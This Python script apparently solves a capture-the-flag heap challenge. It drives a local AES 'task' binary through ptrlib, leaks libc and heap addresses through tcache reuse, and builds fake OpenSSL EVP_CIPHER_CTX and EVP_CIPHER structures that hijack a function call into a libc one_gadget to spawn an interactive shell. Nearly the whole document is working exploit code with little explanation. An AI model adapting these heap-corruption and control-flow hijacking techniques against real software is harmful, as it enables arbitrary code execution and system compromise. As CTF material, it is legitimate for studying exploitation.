from ptrlib import *
from Crypto.Cipher import AES

def add_task_wait(task_id, mode, key, iv, size):
    assert len(key) == 0x20
    assert len(iv) == 0x10
    assert 0 < size <= 0x1000
    sock.recvuntil("Choice: ")
    sock.sendline("1")
    sock.recvuntil("id : ")
    sock.sendline(str(task_id))
    sock.recvuntil("(2): ")
    sock.sendline(str(mode))
    sock.recvuntil("Key : ")
    sock.send(key)
    sock.recvuntil("IV : ")
    sock.send(iv)
    sock.recvuntil("Size : ")
    sock.sendline(str(size))

def add_task(task_id, mode, key, iv, size, data):
    add_task_wait(task_id, mode, key, iv, size)
    sock.recvuntil("Data : ")
    sock.send(data)

def delete_task(task_id):
    sock.recvuntil("Choice: ")
    sock.sendline("2")
    sock.recvuntil("id : ")
    sock.sendline(str(task_id))
    
def go(task_id):
    sock.recvuntil("Choice: ")
    sock.sendline("3")
    sock.recvuntil("id : ")
    sock.sendline(str(task_id))

def recv_cipher():
    sock.recvuntil("Ciphertext:")
    sock.recvline()
    data = b''
    while True:
        line = sock.recvline(timeout=0.5).rstrip()
        if line == b'' or line == None:
            break
        else:
            data += bytes.fromhex(bytes2str(line.replace(b' ', b'')))
    return data

def decrypt(cipher, key, iv):
    c = AES.new(key, AES.MODE_CBC, iv)
    return c.decrypt(cipher)

libc = ELF("./libc-2.27.so")
sock = Process("./task_52f1358baddfd3d4026da4d8c0735e52")
libc_main_arena = 0x3ebc40
libc_one_gadget = 0x10a38c
rop_call_rdx = 0x00009678

key = b'\xff' * 0x20
iv = b'\xff' * 0x10

# leak libc
add_task(100, 1, key, iv, 0x88, b'A' * 0x88)
delete_task(100)
add_task(0, 1, key, iv, 0x98, b'B' * 0x98)
for i in range(7):
    add_task(i+1, 1, key, iv, 0x98, b'A' * 0x98)
add_task(8, 1, key, iv, 0x88, b'A' * 0x88)
for i in range(7):
    delete_task(i+1)
go(0)
delete_task(0)
for i in range(7):
    add_task(i+1, 1, key, iv, 0x98, b'0' * 0x98)
add_task_wait(0, 1, key, iv, 0x98)
cipher = recv_cipher()
libc_base = u64(decrypt(cipher, key, iv)[:8]) - libc_main_arena - 0xf0
logger.info("libc = " + hex(libc_base))
sock.send(b'X' * 0x98)

# heap leak
"""
tcache[0xa0] --> (task0->data)
tcache[0x80] --> (task10) --> (task10->data) --> (task0)
"""
add_task(10, 1, key, iv, 0x78, b'1' * 0x78)
go(0)
delete_task(0)
delete_task(10)
add_task(10, 1, key, iv, 0x98, b'X' * 0x98)
add_task_wait(0, 1, key, iv, 0x78)
sock.send(p64(libc_base + libc_main_arena))
cipher = recv_cipher()
addr_heap = u64(decrypt(cipher, key, iv)[0x60:0x68]) # main_arena->top
logger.info("heap = " + hex(addr_heap))
sock.send(b'X' * 0x70)

# prepare fake EVP_CIPHER_CTX and EVP_CIPHER
fake_cipher_ctx  = p64(addr_heap + 0x540)
fake_cipher_ctx += p64(0)
fake_cipher_ctx += p32(1) + p32(8)
fake_cipher_ctx += iv * 2
fake_cipher_ctx += p64(libc_base + libc_one_gadget) # call [rdx]
fake_cipher_ctx += b'\x00' * (0xa8 - len(fake_cipher_ctx))
add_task(20, 1, key, iv, 0xa8, fake_cipher_ctx)
fake_cipher  = p32(0x1ab) + p32(0x10) # <-- assert rcx == 0
fake_cipher += p32(0x20) + p32(0x10)
fake_cipher += p64(0x1002)
fake_cipher += p64(0xffffffffffffffff)
fake_cipher += p64(libc_base + rop_call_rdx)
fake_cipher += b'\x00' * (0x30 - len(fake_cipher))
add_task(21, 1, key, iv, 0x30, fake_cipher)

# get the shell!
"""
tcache[0xa0] --> (task0->data)
tcache[0x80] --> (task30) --> (task30->data) --> (task0)
"""
logger.info("Executing shell...")
add_task(30, 1, key, iv, 0x78, b'1' * 0x78)
go(0)
delete_task(0)
delete_task(30)
add_task(30, 1, key, iv, 0x98, b'X' * 0x98)
add_task_wait(0, 1, key, iv, 0x78)
payload = p64(addr_heap)
payload += p64(0x78)
payload += p32(1)
payload += key
payload += iv
payload += p32(0) + p64(0) + p64(0)
payload += p64(addr_heap + 0x250)
sock.send(payload)

sock.interactive()
